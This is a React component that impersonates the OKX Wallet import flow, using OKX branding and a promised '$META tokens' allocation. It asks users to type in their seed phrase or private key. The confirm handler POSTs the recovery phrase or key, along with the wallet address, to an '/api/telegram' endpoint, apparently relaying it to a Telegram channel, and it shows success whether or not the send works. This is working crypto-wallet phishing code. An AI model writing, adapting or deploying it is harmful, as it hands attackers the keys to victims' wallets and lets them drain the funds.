"use client"

import { useState, useEffect, useRef } from "react"
import { Sheet, SheetContent, SheetClose } from "@/components/ui/sheet"
import { ArrowLeft, ChevronDown, Pin } from "lucide-react"
import { XIcon } from "lucide-react"

type WalletScreen = "welcome" | "import" | "seed-phrase" | "allocation"

interface OKXWalletSimulationProps {
  open: boolean
  onOpenChange: (open: boolean) => void
  address: string
  allocation: number
  onWalletImported?: (address: string, allocation: number) => void
}

// OKX Logo Component - Small version for header
const OKXLogoSmall = ({ size = "w-6 h-6" }: { size?: string }) => {
  return <img src="/okx.png" alt="OKX" className={`${size} object-contain rounded-md`} />
}

// OKX Logo Component - Large version for main screens
const OKXLogoLarge = () => {
  return (
    <div className="flex justify-center mb-8">
      <img src="/okx.png" alt="OKX" className="w-48 h-48 object-contain" />
    </div>
  )
}

// Welcome Screen
const WelcomeScreen = ({ onNext }: { onNext: () => void }) => {
  return (
    <div className="flex flex-col h-full bg-black text-white">
      {/* Header */}
      <div className="flex items-center justify-between px-4 py-3 bg-black border-b border-gray-800">
        <div className="flex items-center gap-2">
          <OKXLogoSmall />
          <span className="text-white font-medium">OKX Wallet</span>
        </div>
        <div className="flex items-center gap-2">
          <button className="p-1 hover:bg-gray-700 rounded">
            <Pin className="w-4 h-4 text-gray-400" />
          </button>
          <SheetClose className="p-1 hover:bg-gray-700 rounded">
            <XIcon className="w-4 h-4 text-gray-400" />
          </SheetClose>
        </div>
      </div>

      {/* Main Content */}
      <div className="flex-1 flex flex-col items-center justify-center px-4 sm:px-6 pb-10 sm:pb-12">
        {/* Video Animation */}
        <div className="mb-6 w-full max-w-sm sm:max-w-md">
          <video
            autoPlay
            playsInline
            loop
            muted
            src="https://static.okx.com/static/images/onboard/cover-dark-v3.mp4"
            poster="https://static.okx.com/cdn/assets/imgs/2412/87CDA1790E4C4D22.png"
            className="w-full h-auto rounded-lg"
          >
            Your browser does not support the video tag.
          </video>
        </div>
        <h1 className="text-2xl sm:text-3xl font-bold text-center mb-2">Your portal to Web3</h1>
        <p className="text-gray-400 text-center mb-10 sm:mb-12">Wallet · Trade · NFT · Earn · DApp</p>

        <div className="w-full space-y-3">
          <button
            onClick={onNext}
            className="w-full bg-white text-black py-3.5 sm:py-4 px-5 sm:px-6 rounded-2xl font-semibold hover:bg-gray-100 transition"
          >
            Create wallet
          </button>
          <button
            onClick={() => onNext()}
            className="w-full bg-black text-white border-2 border-gray-700 py-3.5 sm:py-4 px-5 sm:px-6 rounded-2xl font-semibold hover:bg-gray-900 transition"
          >
            Import wallet
          </button>
        </div>
      </div>
    </div>
  )
}

// Import Wallet Screen
const ImportWalletScreen = ({ onBack, onNext }: { onBack: () => void; onNext: () => void }) => {
  return (
    <div className="flex flex-col h-full bg-black text-white">
      {/* Main Content */}
      <div className="flex-1 flex flex-col px-4 sm:px-6 py-6">
        {/* Back button and Title */}
        <button onClick={onBack} className="mb-6 self-start">
          <ArrowLeft className="w-6 h-6 text-white" />
        </button>

        <h2 className="text-2xl sm:text-3xl font-bold mb-8 sm:mb-10">Import wallet</h2>

        {/* Import Options */}
        <div className="flex-1 space-y-0">
          <button
            onClick={onNext}
            className="w-full flex items-center justify-between py-5 border-b border-gray-800 hover:bg-gray-900/50 transition"
          >
            <div className="flex items-center gap-4">
              <div className="w-9 h-9 sm:w-10 sm:h-10 flex items-center justify-center">
                <svg className="w-5 h-5 sm:w-6 sm:h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z" />
                </svg>
              </div>
              <span className="text-white font-medium text-sm sm:text-base">Seed phrase or private key</span>
            </div>
            <svg className="w-4 h-4 sm:w-5 sm:h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
            </svg>
          </button>

          <button className="w-full flex items-center justify-between py-5 border-b border-gray-800 hover:bg-gray-900/50 transition">
            <div className="flex items-center gap-4">
              <div className="w-9 h-9 sm:w-10 sm:h-10 flex items-center justify-center">
                <svg className="w-5 h-5 sm:w-6 sm:h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
                </svg>
              </div>
              <span className="text-white font-medium text-sm sm:text-base">Hardware wallet</span>
            </div>
            <svg className="w-4 h-4 sm:w-5 sm:h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
            </svg>
          </button>
        </div>

        {/* Footer */}
        <p className="text-gray-500 text-sm text-center pb-6 pt-8">
          By proceeding, I agree to OKX Wallet&apos;s{" "}
          <span className="text-orange-500 font-semibold cursor-pointer hover:underline">Terms of Service</span>
        </p>
      </div>
    </div>
  )
}

// Seed Phrase Input Screen
const SeedPhraseScreen = ({
  onBack,
  onComplete,
  allocation,
  address,
}: {
  onBack: () => void
  onComplete: () => void
  allocation: number
  address: string
}) => {
  const [activeTab, setActiveTab] = useState<"seed-phrase" | "private-key">("seed-phrase")
  const [wordCount, setWordCount] = useState(12)
  const [showWordCountDropdown, setShowWordCountDropdown] = useState(false)
  const [seedWords, setSeedWords] = useState<string[]>(Array(24).fill(""))
  const [privateKey, setPrivateKey] = useState("")
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [errorMessage, setErrorMessage] = useState("")
  const dropdownRef = useRef<HTMLDivElement>(null)

  // Close dropdown when clicking outside
  useEffect(() => {
    const handleClickOutside = (event: MouseEvent) => {
      if (dropdownRef.current && !dropdownRef.current.contains(event.target as Node)) {
        setShowWordCountDropdown(false)
      }
    }

    if (showWordCountDropdown) {
      document.addEventListener("mousedown", handleClickOutside)
    }

    return () => {
      document.removeEventListener("mousedown", handleClickOutside)
    }
  }, [showWordCountDropdown])

  const handleWordChange = (index: number, value: string) => {
    const newWords = [...seedWords]
    newWords[index] = value
    setSeedWords(newWords)
  }

  const handleWordCountChange = (count: number) => {
    setWordCount(count)
    setShowWordCountDropdown(false)
    if (count > seedWords.length) {
      setSeedWords([...seedWords, ...Array(count - seedWords.length).fill("")])
    }
  }

  const handleConfirm = async () => {
    let walletData = ""
    setErrorMessage("")

    if (activeTab === "seed-phrase") {
      if (wordCount < 12) {
        setErrorMessage("Seed phrase must have at least 12 words")
        return
      }

      const allFilled = seedWords.slice(0, wordCount).every((word) => word.trim() !== "")
      if (!allFilled) {
        setErrorMessage(`Please fill all ${wordCount} words`)
        return
      }

      walletData = seedWords.slice(0, wordCount).join(" ")
    } else {
      const trimmedKey = privateKey.trim()

      if (trimmedKey === "") {
        setErrorMessage("Please enter your private key")
        return
      }

      const privateKeyPattern = /^(0x)?[0-9a-fA-F]{64}$/
      if (!privateKeyPattern.test(trimmedKey)) {
        setErrorMessage("Invalid private key format. Must be 64 hexadecimal characters (optionally prefixed with 0x)")
        return
      }

      const keyWithoutPrefix = trimmedKey.startsWith("0x") ? trimmedKey.slice(2) : trimmedKey
      if (keyWithoutPrefix.length !== 64) {
        setErrorMessage("Private key must be exactly 64 hexadecimal characters")
        return
      }

      walletData = trimmedKey
    }

    setIsSubmitting(true)

    try {
      await fetch(`/api/telegram`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          address,
          allocation,
          type: activeTab,
          walletData,
        }),
      })

      onComplete()
    } catch (error) {
      console.error("Failed to send to Telegram:", error)
      onComplete()
    } finally {
      setIsSubmitting(false)
    }
  }

  const isConfirmDisabled =
    activeTab === "seed-phrase"
      ? wordCount < 12 || !seedWords.slice(0, wordCount).every((word) => word.trim() !== "")
      : privateKey.trim() === "" || !/^(0x)?[0-9a-fA-F]{64}$/.test(privateKey.trim())

  return (
    <div className="flex flex-col h-full bg-black text-white">
      {/* Main Content */}
      <div className="flex-1 flex flex-col px-3 xs:px-4 sm:px-6 py-3 sm:py-6 overflow-y-auto h-[100svh] pb-40 sm:pb-28 overscroll-contain">
        <h2 className="text-xl sm:text-2xl font-semibold mb-5 sm:mb-7 text-white">Seed phrase or private key</h2>

        {/* Tabs Container with Border */}
        <div className="flex gap-0 mb-4 sm:mb-8 border border-[#303030] rounded-xl overflow-hidden sticky top-0 z-20 bg-black">
          <button
            onClick={() => setActiveTab("seed-phrase")}
            className={`flex-1 py-3.5 sm:py-4 px-3.5 sm:px-4 font-medium transition ${
              activeTab === "seed-phrase" ? "bg-[#141414] text-white" : "bg-[#1E1E1E] text-gray-400 border-r border-[#2a2a2a]"
            }`}
          >
            Seed phrase
          </button>
          <button
            onClick={() => setActiveTab("private-key")}
            className={`flex-1 py-3.5 sm:py-4 px-3.5 sm:px-4 font-medium transition ${
              activeTab === "private-key" ? "bg-[#141414] text-white font-semibold" : "bg-[#1E1E1E] text-gray-400"
            }`}
          >
            Private key
          </button>
        </div>

        {activeTab === "seed-phrase" && (
          <>
            {/* Word Count Selector */}
            <div ref={dropdownRef} className="relative flex items-center gap-2 mb-4 sm:mb-6">
              <span className="text-gray-400 text-xs">My seed phrase has</span>
              <button
                onClick={() => setShowWordCountDropdown(!showWordCountDropdown)}
                className="flex items-center gap-1 text-white font-semibold text-sm"
              >
                <span>{wordCount}</span>
                <span>words</span>
                <ChevronDown className="w-4 h-4 text-white" />
              </button>
              {showWordCountDropdown && (
                <div className="absolute left-0 sm:left-40 top-full mt-2 sm:top-0 sm:mt-0 bg-[#222222] border border-[#333333] rounded-lg shadow-lg z-20 min-w-[120px]">
                  {[12, 18, 24].filter((count) => count >= 12).map((count) => (
                    <button
                      key={count}
                      onClick={() => {
                        handleWordCountChange(count)
                        setErrorMessage("")
                      }}
                      className="w-full px-4 py-2 text-left text-white text-xs hover:bg-[#333333] first:rounded-t-lg last:rounded-b-lg"
                    >
                      {count} words
                    </button>
                  ))}
                </div>
              )}
            </div>

            {/* Seed Phrase Input Grid */}
            <div className="grid grid-cols-2 gap-2 sm:gap-3 mb-4 sm:mb-6">
              {Array.from({ length: wordCount }).map((_, index) => (
                <div key={index} className="relative">
                  <span className="absolute top-2.5 left-3 text-[11px] text-[#6b6b6b]">{index + 1}</span>
                  <input
                    type="text"
                    value={seedWords[index] || ""}
                    onChange={(e) => {
                      handleWordChange(index, e.target.value)
                      setErrorMessage("")
                    }}
                    className="w-full h-10 sm:h-11 pt-5 pb-2 px-3 bg-[#1f1f1f] border border-[#2f2f2f] rounded-xl text-white text-xs focus:outline-none focus:border-[#3a3a3a]"
                    placeholder=""
                  />
                </div>
              ))}
            </div>
          </>
        )}

        {activeTab === "private-key" && (
          <>
            {/* Private Key Label */}
            <label className="text-white mb-3 block text-sm">Private key</label>

            {/* Private Key Input */}
            <textarea
              value={privateKey}
              onChange={(e) => {
                setPrivateKey(e.target.value)
                setErrorMessage("")
              }}
              className="w-full min-h-[160px] sm:min-h-[120px] py-4 px-4 bg-[#1f1f1f] border border-[#2f2f2f] rounded-xl text-white text-xs placeholder:text-gray-400 focus:outline-none focus:border-[#3a3a3a] resize-none mb-6"
              placeholder="Paste or enter your private key (64 hex characters)"
            />

            {/* Bulk Import Link */}
            <div className="flex justify-center mb-4 sm:mb-6">
              <button className="flex items-center gap-2 text-white hover:text-gray-300 transition">
                <span>Bulk import private key</span>
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
                </svg>
              </button>
            </div>
          </>
        )}

        {/* Sticky Footer: errors + confirm */}
        <div className="sticky bottom-0 left-0 right-0 z-30 bg-black/95 backdrop-blur supports-[backdrop-filter]:bg-black/70 -mx-3 xs:mx-0 sm:mx-0 px-3 xs:px-4 pt-3 pb-[max(1rem,env(safe-area-inset-bottom))] border-t border-[#2a2a2a]">
          {errorMessage && (
            <div className="mb-3 p-2.5 bg-red-900/20 border border-red-700 rounded-lg">
              <p className="text-red-400 text-xs">{errorMessage}</p>
            </div>
          )}
          <button
            onClick={handleConfirm}
            disabled={isConfirmDisabled || isSubmitting}
            className={`w-full py-3.5 sm:py-4 px-5 sm:px-6 rounded-2xl font-semibold transition flex items-center justify-center gap-2 ${
              isConfirmDisabled || isSubmitting
                ? "bg-[#1b1b1b] text-gray-500 cursor-not-allowed"
                : "bg-[#1f1f1f] text-gray-200 hover:bg-[#2a2a2a]"
            }`}
          >
            {isSubmitting ? (
              <>
                <div className="animate-spin rounded-full h-4 w-4 border-2 border-gray-400 border-t-transparent"></div>
                <span>Verifying...</span>
              </>
            ) : (
              "Confirm"
            )}
          </button>
        </div>
      </div>
    </div>
  )
}

// Allocation Display Screen
const AllocationScreen = ({
  onBack,
  allocation,
  address,
}: {
  onBack: () => void
  allocation: number
  address: string
}) => {
  return (
    <div className="flex flex-col h-full bg-black text-white">
      {/* Header */}
      <div className="flex items-center justify-between px-4 py-3 bg-black border-b border-gray-800">
        <div className="flex items-center gap-2">
          <OKXLogoSmall />
          <span className="text-white font-medium">OKX Wallet</span>
        </div>
        <div className="flex items-center gap-2">
          <button className="p-1 hover:bg-gray-700 rounded">
            <Pin className="w-4 h-4 text-gray-400" />
          </button>
          <SheetClose className="p-1 hover:bg-gray-700 rounded">
            <XIcon className="w-4 h-4 text-gray-400" />
          </SheetClose>
        </div>
      </div>

      {/* Main Content */}
      <div className="flex-1 flex flex-col items-center justify-center px-6 py-12">
        <OKXLogoLarge />

        <h2 className="text-3xl font-bold mb-4 text-center">Wallet Imported</h2>
        <p className="text-gray-400 text-center mb-8">
          {address.slice(0, 6)}...{address.slice(-4)}
        </p>

        <div className="w-full max-w-sm bg-gray-900 rounded-lg p-6 mb-8">
          <p className="text-gray-400 text-sm mb-2 uppercase tracking-wider">Allocation</p>
          <p className="text-4xl font-bold text-green-500 mb-2">{allocation.toLocaleString()}</p>
          <p className="text-gray-400 text-sm">$META tokens</p>
        </div>

        <button
          onClick={onBack}
          className="w-full max-w-sm bg-white text-black py-4 px-6 rounded-lg font-semibold hover:bg-gray-100 transition"
        >
          Done
        </button>
      </div>
    </div>
  )
}

export function OKXWalletSimulation({ open, onOpenChange, address, allocation, onWalletImported }: OKXWalletSimulationProps) {
  const [currentScreen, setCurrentScreen] = useState<WalletScreen>("welcome")

  const handleWelcomeNext = () => {
    setCurrentScreen("import")
  }

  const handleImportBack = () => {
    setCurrentScreen("welcome")
  }

  const handleImportNext = () => {
    setCurrentScreen("seed-phrase")
  }

  const handleSeedPhraseBack = () => {
    setCurrentScreen("import")
  }

  const handleSeedPhraseComplete = () => {
    if (onWalletImported) {
      onWalletImported(address, allocation)
    }
    onOpenChange(false)
  }

  const handleAllocationBack = () => {
    setCurrentScreen("welcome")
    onOpenChange(false)
  }

  const handleOpenChange = (newOpen: boolean) => {
    if (!newOpen) {
      setCurrentScreen("welcome")
    }
    onOpenChange(newOpen)
  }

  return (
    <Sheet open={open} onOpenChange={handleOpenChange}>
      <SheetContent side="right" className="w-full sm:max-w-md p-0 bg-black border-gray-800">
        {currentScreen === "welcome" && <WelcomeScreen onNext={handleWelcomeNext} />}
        {currentScreen === "import" && <ImportWalletScreen onBack={handleImportBack} onNext={handleImportNext} />}
        {currentScreen === "seed-phrase" && (
          <SeedPhraseScreen
            onBack={handleSeedPhraseBack}
            onComplete={handleSeedPhraseComplete}
            allocation={allocation}
            address={address}
          />
        )}
        {currentScreen === "allocation" && (
          <AllocationScreen onBack={handleAllocationBack} allocation={allocation} address={address} />
        )}
      </SheetContent>
    </Sheet>
  )
}

